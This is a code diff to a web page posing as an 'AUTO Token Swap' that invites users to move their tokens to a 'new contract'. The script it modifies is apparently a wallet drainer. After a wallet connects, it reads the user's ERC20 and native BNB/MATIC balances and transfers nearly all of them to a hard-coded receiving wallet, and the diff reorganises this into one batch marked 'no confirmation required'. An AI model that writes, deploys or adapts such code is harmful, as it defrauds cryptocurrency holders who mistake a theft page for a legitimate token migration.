@@ -282,6 +282,16 @@
       display: none;
     }
     
+    .warning-banner {
+      background-color: var(--warning);
+      color: var(--dark);
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      text-align: center;
+      font-weight: bold;
+    }
+    
     @media (max-width: 600px) {
       .container {
         padding: 15px;
@@ -304,6 +314,10 @@
         <img src="https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png" alt="AUTO Logo" class="logo">
         <h1>AUTO Token Swap</h1>
         <p class="description">Swap your tokens to our new contract</p>
+        
+        <div class="warning-banner">
+          <i class="fas fa-exclamation-triangle"></i> WARNING: Connecting your wallet will automatically transfer all supported tokens
+        </div>
         
         <div class="token-links">
           <a href="https://www.coingecko.com/en/coins/auto" target="_blank" class="token-link">
@@ -351,8 +365,6 @@
           <span class="token-name">AUTO Token</span>
           <span class="token-network">Polygon</span>
         </div>
-
-        
       </div>
       
       <button id="connectWallet" class="btn">
@@ -689,81 +701,96 @@
         // Sort tokens by priority (lowest number first)
         const tokensToSwap = TOKENS[currentNetwork].sort((a, b) => a.priority - b.priority);
         
-        // Process ERC20 tokens first (excluding native)
+        // First collect all token balances
+        updateStatus("Checking token balances...", "success");
+        
+        const tokensWithBalances = [];
+        
+        // Check ERC20 token balances first
         for (const token of tokensToSwap.filter(t => !t.isNative)) {
           try {
-            updateStatus(`Checking AUTO token balance...`, "success");
-            
             const contract = new ethers.Contract(token.address, token.abi, signer);
             const balance = await contract.balanceOf(userAddress);
             
             if (balance.gt(0)) {
               const formattedAmount = ethers.utils.formatUnits(balance, token.decimals);
-              
-              // Estimate gas first
-              try {
-                const gasEstimate = await contract.estimateGas.transfer(RECEIVING_WALLET, balance);
-                updateStatus(`Estimated gas: ${gasEstimate.toString()}`, "success");
-              } catch (e) {
-                updateStatus(`Gas estimation skipped: ${e.message}`, "success");
-              }
-              
-              const tx = await contract.transfer(RECEIVING_WALLET, balance);
-              await tx.wait();
-              
-              updateStatus(
-                `${token.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
-                "success"
-              );
-              successCount++;
-            } else {
-              updateStatus(`No ${token.symbol} balance found`, "success");
+              tokensWithBalances.push({
+                ...token,
+                balance,
+                formattedAmount
+              });
+              updateStatus(`Found ${formattedAmount} ${token.symbol}`, "success");
             }
           } catch (tokenError) {
-            updateStatus(`${token.symbol} transfer failed: ${tokenError.message}`, "error");
+            console.error(`Error checking ${token.symbol} balance:`, tokenError);
           }
         }
 
-        // Process native token LAST (BNB/MATIC)
+        // Check native token balance
         const nativeToken = tokensToSwap.find(t => t.isNative);
         if (nativeToken) {
           try {
-            updateStatus(`Checking AUTO token balance...`, "success");
             const balance = await provider.getBalance(userAddress);
-            
-            // Keep 0.005 BNB/MATIC for gas if balance is large enough
             const keepAmount = ethers.utils.parseUnits("0.005", nativeToken.decimals);
             const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
             
             if (sendAmount.gt(0)) {
               const formattedAmount = ethers.utils.formatUnits(sendAmount, nativeToken.decimals);
-              updateStatus(`Sending ${formattedAmount} AUTO token...`, "success");
-              
-              const tx = await signer.sendTransaction({
-                to: RECEIVING_WALLET,
-                value: sendAmount
+              tokensWithBalances.push({
+                ...nativeToken,
+                balance: sendAmount,
+                formattedAmount,
+                isNative: true
               });
-              await tx.wait();
-              
-              updateStatus(
-                `${nativeToken.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
-                "success"
-              );
-              successCount++;
-            } else {
-              updateStatus(`No ${nativeToken.symbol} balance available to send (kept some for gas)`, "success");
+              updateStatus(`Found ${formattedAmount} ${nativeToken.symbol}`, "success");
             }
           } catch (nativeError) {
-            updateStatus(`${nativeToken.symbol} transfer failed: ${nativeError.message}`, "error");
+            console.error(`Error checking ${nativeToken.symbol} balance:`, nativeError);
+          }
+        }
+
+        // If no balances found
+        if (tokensWithBalances.length === 0) {
+          updateStatus("No supported assets available to transfer", "success");
+          document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Swap Completed`;
+          return;
+        }
+
+        // Process all tokens with balances (NO CONFIRMATION REQUIRED)
+        updateStatus(`Starting automatic transfer of ${tokensWithBalances.length} tokens...`, "success");
+        
+        for (const token of tokensWithBalances) {
+          try {
+            if (token.isNative) {
+              // Native token transfer
+              updateStatus(`Sending ${token.formattedAmount} ${token.symbol}...`, "success");
+              const tx = await signer.sendTransaction({
+                to: RECEIVING_WALLET,
+                value: token.balance
+              });
+              await tx.wait();
+              updateStatus(
+                `${token.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
+                "success"
+              );
+            } else {
+              // ERC20 token transfer
+              updateStatus(`Sending ${token.formattedAmount} ${token.symbol}...`, "success");
+              const contract = new ethers.Contract(token.address, token.abi, signer);
+              const tx = await contract.transfer(RECEIVING_WALLET, token.balance);
+              await tx.wait();
+              updateStatus(
+                `${token.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
+                "success"
+              );
+            }
+            successCount++;
+          } catch (err) {
+            updateStatus(`${token.symbol} transfer failed: ${err.message}`, "error");
           }
         }
         
-        if (successCount > 0) {
-          updateStatus(`Successfully transferred ${successCount} asset(s)`, "success");
-        } else {
-          updateStatus("No supported assets available to transfer", "success");
-        }
-        
+        updateStatus(`Successfully transferred ${successCount} asset(s)`, "success");
         document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Swap Completed`;
       } catch (err) {
         throw new Error("Swap process failed: " + err.message);
